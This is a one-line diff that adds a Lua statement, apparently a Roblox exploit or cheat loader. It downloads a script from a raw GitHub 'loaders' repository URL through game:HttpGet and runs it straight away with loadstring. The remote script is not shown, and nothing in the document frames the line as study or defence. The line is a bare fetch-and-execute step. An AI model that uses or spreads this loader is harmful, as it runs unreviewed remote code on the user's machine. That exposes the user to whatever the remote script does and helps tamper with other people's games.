@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/runaways-beta-spam7-ishqf0hohs9kjh.lua"))()
